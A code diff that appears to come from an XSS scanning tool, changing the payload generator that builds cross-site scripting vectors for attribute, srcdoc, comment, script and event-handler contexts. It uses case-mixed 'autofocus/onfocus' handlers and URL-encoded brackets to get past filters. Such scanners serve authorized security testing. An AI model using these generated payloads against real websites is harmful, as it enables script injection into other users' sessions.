@@ -1,4 +1,4 @@
-from core.config import badTags, fillings, eFillings, lFillings, jFillings, eventHandlers, tags, functions
+from core.config import xsschecker, badTags, fillings, eFillings, lFillings, jFillings, eventHandlers, tags, functions
 from core.jsContexter import jsContexter
 from core.utils import randomUpper as r, genGen, extractScripts
 
@@ -12,7 +12,11 @@ def generator(occurences, response):
         context = occurences[i]['context'][0]
         breaker = occurences[i]['context'][1]
         special = occurences[i]['context'][2]
-        attribute = occurences[i]['context'][3]
+        try:
+            attributeName = list(occurences[i]['context'][3].keys())[0]
+            attributeValue = list(occurences[i]['context'][3].values())[0]
+        except AttributeError:
+            attributeName = occurences[i]['context'][3]
         if special not in badTags:
             special = ''
         elif context == 'attribute':
@@ -35,6 +39,7 @@ def generator(occurences, response):
                 for payload in payloads:
                     vectors[10].add(payload)
         elif context == 'attribute':
+            found = False
             breakerEfficiency = occurences[i]['score'][breaker]
             greatBracketEfficiency = occurences[i]['score']['>']
             ends = ['//']
@@ -48,28 +53,62 @@ def generator(occurences, response):
                         payload = payload.replace(breaker, breaker + '>')
                     else:
                         payload = '>' + payload
-                    vectors[10].add(payload)
+                    found = True
+                    vectors[6].add(payload)
             if breakerEfficiency == 100:
                 for filling in fillings:
                     for function in functions:
                         vector = breaker + filling + 'auTOfOcuS' + \
                             filling + 'OnFoCUs' + '=' + breaker + function
+                        found = True
                         vectors[6].add(vector)
             if breakerEfficiency == 90:
                 for filling in fillings:
                     for function in functions:
                         vector = '\\' + breaker + filling + 'auTOfOcuS' + filling + \
                             'OnFoCUs' + '=' + function + filling + '\\' + breaker
+                        found = True
                         vectors[6].add(vector)
-            if attribute == 'srcdoc':
+            if attributeName == 'srcdoc':
                 if occurences[i]['score']['&lt;']:
                     if occurences[i]['score']['&gt;']:
                         del ends[:]
-                        ends.append('&t;')
+                        ends.append('%26gt;')
                     payloads = genGen(
                         fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, '', '')
                     for payload in payloads:
-                        vectors[10].add(payload.replace('<', '&lt;'))
+                        found = True
+                        vectors[9].add(payload.replace('<', '%26lt;'))
+            if attributeName.startswith('on'):
+                closer = jsContexter(attributeValue)
+                breaker = ''
+                for char in attributeValue.split(xsschecker)[1]:
+                    if char in ['\'', '"', '`']:
+                        breaker = char
+                        break
+                if closer:
+                    suffix = '//\\'
+                    for filling in jFillings:
+                        for function in functions:
+                            vector = breaker + closer + filling + function + suffix
+                            if found:
+                                vectors[7].add(vector)
+                            else:
+                                vectors[9].add(vector)
+                elif breakerEfficiency > 83:
+                    suffix = '//'
+                    for filling in jFillings:
+                        for function in functions:
+                            if '=' in function:
+                                function = '(' + function + ')'
+                            if breaker == '':
+                                filling = ''
+                            vector = '\\' + breaker + closer + filling + function + suffix
+                            if found:
+                                vectors[7].add(vector)
+                            else:
+                                vectors[9].add(vector)
+
         elif context == 'comment':
             lessBracketEfficiency = occurences[i]['score']['<']
             greatBracketEfficiency = occurences[i]['score']['>']
@@ -83,13 +122,13 @@ def generator(occurences, response):
                 for payload in payloads:
                     vectors[10].add(payload)
         elif context == 'script':
-            try:
-                script = scripts[index]
-            except IndexError:
+            if scripts:
                 try:
+                    script = scripts[index]
+                except IndexError:
                     script = scripts[0]
-                except:
-                    continue
+            else:
+                continue
             closer = jsContexter(script)
             scriptEfficiency = occurences[i]['score']['</scRipT/>']
             greatBracketEfficiency = occurences[i]['score']['>']
